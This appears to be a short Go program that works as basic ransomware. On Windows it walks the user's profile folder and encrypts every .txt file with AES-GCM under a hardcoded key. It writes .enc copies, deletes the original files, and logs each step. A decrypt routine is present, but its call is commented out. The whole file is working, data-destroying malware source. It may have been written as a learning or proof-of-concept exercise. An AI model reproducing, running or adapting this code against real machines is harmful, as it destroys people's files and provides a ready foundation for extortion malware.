package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func encrypt(key []byte, fileNames []string) {

	for _, f := range fileNames {
		plaintext, err := ioutil.ReadFile(f)
		if err != nil {
			log.Fatal(err)
		}

		block, err := aes.NewCipher(key)
		if err != nil {
			log.Panic(err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			log.Panic(err)
		}

		nonce := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			log.Fatal(err)
		}

		ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

		err = ioutil.WriteFile(f+".enc", ciphertext, 0777)
		if err != nil {
			log.Panic(err)
		}
		writeLog("Encrypted: " + f)

		err = os.Remove(f)
		if err != nil {
			log.Panic(err)
		}
	}
	writeLog("Encryption routine complete!")
}

func decrypt(key []byte, fileNames []string) {

	for _, f := range fileNames {
		ciphertext, err := ioutil.ReadFile(f)
		if err != nil {
			log.Fatal(err)
		}

		block, err := aes.NewCipher(key)
		if err != nil {
			log.Panic(err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			log.Panic(err)
		}

		nonce := ciphertext[:gcm.NonceSize()]
		ciphertext = ciphertext[gcm.NonceSize():]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			log.Panic(err)
		}

		fname := strings.Replace(f, ".enc", "", -1)
		err = ioutil.WriteFile(fname, plaintext, 0777)
		if err != nil {
			log.Panic(err)
		}
		writeLog("Decrypted: " + fname)
		err = os.Remove(f)
		if err != nil {
			log.Panic(err)
		}
	}
	writeLog("Decryption routine complete!")

}

func getFilenames(userHome string, ignoreDirectory []string, targetExt []string) []string {
	var fileList = []string{}

	filepath.Walk(userHome, func(path string, f os.FileInfo, err error) error {

		for _, folder := range ignoreDirectory {
			if strings.HasPrefix(path, userHome+folder) {
				return nil
			}
		}

		if stringInSlice(filepath.Ext(path), targetExt) {
			fileList = append(fileList, path)
			if err != nil {
				log.Panic(err)
			}
		}
		return nil
	})
	return fileList
}

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func generateDate(format string) string {
	if format == "" {
		format = "20060102"
	}

	currentTime := time.Now()
	var formattedDate = currentTime.Format(format)

	return string(formattedDate)
}

func writeLog(data string) {

	hName, err := os.Hostname()
	if err != nil {
		log.Panic(err)
	}
	hName += "_" + generateDate("") + ".log"

	cwd, err := os.Getwd()
	if err != nil {
		log.Panic(err)
	}

	logFilePath := cwd + "\\" + hName

	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		logFile, err := os.Create(logFilePath)
		if err != nil {
			log.Panic(err)
		}
		logFile.Close()
	}

	f, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Panic(err)
	}

	writeMeToLog := generateDate("2006-01-02T15:04:05.999999-07:00") + " " + data + "\n"
	_, err = f.Write([]byte(writeMeToLog))
	if err != nil {
		log.Panic(err)
	}
	f.Close()

}

func main() {

	var ignoreDirectory = []string{
		"\\AppData",
		"\\.vscode",
		"\\go",
	}

	targetExt := []string{
		".txt",
	}

	//encExt := []string{
	//	".enc",
	//}

	if runtime.GOOS != "windows" {
		fmt.Println("[-] Unsupported OS")
	} else {
		// key must be 16, 24 or 32 bytes long
		key := []byte("password12345678")
		userHome := os.Getenv("USERPROFILE")

		fnames := getFilenames(userHome, ignoreDirectory, targetExt)
		encrypt(key, fnames)

		//fnames := getFilenames(userHome, ignoreDirectory, encExt)
		//decrypt(key, fnames)
	}
}
